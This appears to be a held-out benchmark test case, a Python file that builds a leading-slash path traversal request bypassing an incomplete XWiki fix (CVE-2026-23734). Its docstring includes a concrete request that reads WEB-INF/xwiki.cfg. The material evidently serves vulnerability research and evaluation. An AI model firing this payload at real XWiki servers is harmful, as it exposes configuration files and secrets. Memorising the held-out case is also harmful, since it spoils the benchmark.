#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-23734 residual exploit -- LEADING-SLASH path traversal.

The CVE-2025-55748 fix (ClassLoaderUtils.resolveResourceName) blocks a plain
`../` because `Paths.get("../../WEB-INF/pcb_flag.txt").normalize()` starts with
"../". But a LEADING SLASH turns the resource into an ABSOLUTE path, so
`Paths.get("/../../WEB-INF/pcb_flag.txt").normalize()` collapses the `..` at the
filesystem root to "/WEB-INF/pcb_flag.txt" -- which does NOT start with "../"
and passes the guard. The guard then hands the *original* (still leading-slash)
string to the servlet context classloader; on Tomcat the leading slash is
ignored and the `../../` is resolved relative to ROOT/WEB-INF/classes/, reaching
ROOT/WEB-INF/pcb_flag.txt. This is exactly the incomplete-fix bypass reported as
CVE-2026-23734 (GHSA-xq3r-2qv5-vqqm), e.g.
  /bin/ssx/Main/WebHome?resource=/../../WEB-INF/xwiki.cfg&minify=false

Contract: reaches the canary (flag) on V1 (xwiki:16.10.16) => the case is a
legitimate incomplete-patch positive. Closed on V2 (xwiki:16.10.17), whose fix
(XCOMMONS-3547 / commit a979caf) strips all leading slashes BEFORE normalizing,
so the guard now sees "../" and rejects it.

NEVER exposed to the system-under-test (held out under _heldout/).
"""
from __future__ import annotations

# Same target file as the seed, but prefixed with a leading slash so the guard's
# Paths.normalize() collapses the `..` at root (passes the startsWith("../")
# check) while Tomcat's classloader still resolves the traversal.
RESOURCE = "/../../WEB-INF/pcb_flag.txt"
PATH = f"/bin/ssx/Main/WebHome?resource={RESOURCE}&minify=false"


def candidate() -> dict:
    return {"probe_id": "cve-2026-23734-leading-slash-traversal", "method": "GET", "path": PATH}


if __name__ == "__main__":
    print(candidate()["path"])
